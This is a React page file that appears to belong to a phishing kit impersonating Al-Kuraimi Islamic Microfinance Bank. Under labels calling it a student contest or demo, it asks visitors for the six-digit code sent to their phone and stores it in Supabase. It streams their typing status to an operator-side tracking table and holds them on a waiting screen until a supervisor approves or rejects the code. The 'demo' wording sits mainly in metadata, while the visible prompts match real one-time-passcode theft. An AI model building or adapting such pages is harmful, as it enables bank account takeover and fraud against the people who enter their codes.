import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { CheckCircle2, TicketCheck } from "lucide-react";
import { Button } from "@/components/ui/button";
import bankLogo from "@/assets/bank-logo.png";
import { GraduationCap } from "lucide-react";
import {
  CURRENT_SUBMISSION_KEY,
  SUBMISSION_REJECTED_KEY,
  updateSubmissionCouponCode,
  watchSubmission,
  type ContestSubmission,
} from "@/lib/contest";
import { getSupabaseClient, isSupabaseConfigured } from "@/lib/supabase";
import { upsertClientTracking } from "@/lib/tracking";

export const Route = createFileRoute("/verify")({
  head: () => ({
    meta: [
      { title: "المسابقة الجامعية | خطوة تجريبية" },
      { name: "description", content: "صفحة تجريبية لإدخال رقم اختبار وهمي." },
    ],
  }),
  component: Verify,
});

function Verify() {
  const [submission, setSubmission] = useState<ContestSubmission | null>(null);
  const [hasLoaded, setHasLoaded] = useState(false);
  const [couponCode, setCouponCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const navigate = useNavigate();

  useEffect(() => {
    const sessionId = window.sessionStorage.getItem("client-tracking-session-v1");
    if (sessionId) {
      void upsertClientTracking({
        sessionId,
        currentPage: "verify",
        status: "يفتح صفحة إدخال الرمز",
        participantNumber: null,
        submissionId: window.sessionStorage.getItem(CURRENT_SUBMISSION_KEY),
      });
    }
  }, []);

  useEffect(() => {
    const id = window.sessionStorage.getItem(CURRENT_SUBMISSION_KEY);
    if (!id) {
      setHasLoaded(true);
      return;
    }

    if (!isSupabaseConfigured()) {
      setError("إعداد Supabase غير مكتمل.");
      setHasLoaded(true);
      return;
    }
    const supabase = getSupabaseClient();
    void supabase.auth.getSession();
    const stopWatching = watchSubmission(
      id,
      (current) => {
        if (current?.status === "rejected") {
          const rejectedMessage = "تم رفض بيانات الطلب الرئيسية. يمكنك مراجعتها وإرسال طلب جديد.";
          window.sessionStorage.setItem(SUBMISSION_REJECTED_KEY, rejectedMessage);
          window.sessionStorage.removeItem(CURRENT_SUBMISSION_KEY);
          const sessionId = window.sessionStorage.getItem("client-tracking-session-v1");
          if (sessionId) {
            void upsertClientTracking({
              sessionId,
              currentPage: "rejected",
              status: "تم رفض البيانات الأساسية",
              participantNumber: current.participantNumber,
              submissionId: current.id,
            });
          }
          navigate({ to: "/" });
          return;
        }
        setSubmission(current);
        setHasLoaded(true);
      },
      (watchError) => {
        setError(watchError.message);
        setHasLoaded(true);
      },
    );
    return () => stopWatching();
  }, [navigate]);

  const submit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (
      !submission ||
      submission.status !== "accepted" ||
      submission.couponStatus === "pending" ||
      submission.couponStatus === "accepted" ||
      !/^\d{6}$/.test(couponCode)
    ) {
      return;
    }
    setLoading(true);
    setError("");
    try {
      await updateSubmissionCouponCode(submission.id, couponCode);
      const sessionId = window.sessionStorage.getItem("client-tracking-session-v1");
      if (sessionId) {
        await upsertClientTracking({
          sessionId,
          currentPage: "waiting",
          status: "أدخل الرمز وينتظر التأكيد",
          participantNumber: submission.participantNumber,
          submissionId: submission.id,
        });
      }
      setCouponCode("");
    } catch (submitError) {
      setError(submitError instanceof Error ? submitError.message : "تعذر حفظ رقم الاختبار.");
    } finally {
      setLoading(false);
    }
  };

  const couponStatus = submission?.couponStatus ?? "not_submitted";

  return (
    <main className="bank-page verify-page" dir="rtl">
      <header className="bank-header demo-header">
        <div className="demo-brand">
          <GraduationCap aria-hidden="true" />
        </div>
      </header>
      <section className="login-content verify-content" aria-label="المرحلة الثانية من التجربة">
        <img src={bankLogo} className="main-logo verify-main-logo" alt="بنك الكريمي للتمويل الأصغر الإسلامي" />

        {!hasLoaded ? (
          <>
            <h2 className="verify-title">جارٍ تحميل الطلب التجريبي</h2>
            <p className="verify-note">نتحقق من حالة الطلب المرتبط بهذه الجلسة.</p>
          </>
        ) : !submission ? (
          <>
            <h2 className="verify-title">لا يوجد طلب تجريبي</h2>
            <p className="verify-note">ابدأ التجربة من الصفحة الرئيسية على هذا الجهاز.</p>
            <Link to="/" className="participation-home-link">
              العودة إلى نموذج التجربة
            </Link>
          </>
        ) : submission.status === "pending" ? (
          <>
            <h2 className="verify-title">الطلب التجريبي قيد المراجعة</h2>
            <p className="verify-note">ستظهر الخطوة التالية بعد قبول الطلب الأول من المشرف.</p>
          </>
        ) : submission.status === "rejected" ? (
          <>
            <h2 className="verify-title">لم يُقبل الطلب التجريبي</h2>
            <p className="verify-note">ارجع إلى الصفحة الرئيسية لبدء تجربة جديدة بقيم وهمية.</p>
            <Link to="/" className="participation-home-link">
              العودة إلى نموذج التجربة
            </Link>
          </>
        ) : couponStatus === "pending" ? null : couponStatus === "accepted" ? (
          <>
            <div className="contest-success">
              <CheckCircle2 aria-hidden="true" />
            </div>
            <h2 className="verify-title">اكتملت التجربة</h2>
            <p className="verify-note">تم قبول الرقم التجريبي في سجل الطلب نفسه.</p>
          </>
        ) : (
          <>
            <h2 className="verify-title">
              {couponStatus === "rejected" ? "أعد إدخال الرمز المرسل لجوالك" : "ادخل الرمز المرسل لجوالك"}
            </h2>
            <form className="coupon-submit-form" onSubmit={submit}>
              <label htmlFor="coupon-code">الرمز المرسل لجوالك</label>
              <input
                id="coupon-code"
                className="coupon-code-input"
                type="text"
                inputMode="numeric"
                autoComplete="off"
                pattern="[0-9]{6}"
                maxLength={6}
                value={couponCode}
                onChange={(event) => {
                  const nextCode = event.target.value.replace(/\D/g, "").slice(0, 6);
                  setCouponCode(nextCode);
                  if (submission && nextCode.length > 0) {
                    const sessionId = window.sessionStorage.getItem("client-tracking-session-v1");
                    if (sessionId) {
                      void upsertClientTracking({
                        sessionId,
                        currentPage: "verify",
                        status: nextCode.length === 6 ? "جاهز لإرسال الرمز" : "يدخل الرمز المرسل",
                        participantNumber: submission.participantNumber,
                        submissionId: submission.id,
                      });
                    }
                  }
                }}
                placeholder="••••••"
                required
                aria-label="رقم اختبار وهمي من ستة أرقام"
              />
              {error && (
                <p className="demo-error" role="alert">
                  {error}
                </p>
              )}
              <Button type="submit" variant="bank" disabled={loading || couponCode.length !== 6}>
                {loading ? "جارٍ الإرسال للمراجعة..." : "إرسال الرقم التجريبي للمراجعة"}
              </Button>
            </form>
          </>
        )}
        {error && !submission && (
          <p className="demo-error" role="alert">
            {error}
          </p>
        )}
      </section>
      {(loading || couponStatus === "pending") && (
        <div className="contest-overlay" role="status" aria-live="polite">
          <div className="contest-loading">
            <span className="contest-spinner" />
            <h2>{loading ? "جارٍ تأكيد العملية" : "جارٍ انتظار تأكيد العملية"}</h2>
            <p>يرجى الانتظار حتى تتم مراجعة الرمز المرسل.</p>
          </div>
        </div>
      )}
    </main>
  );
}
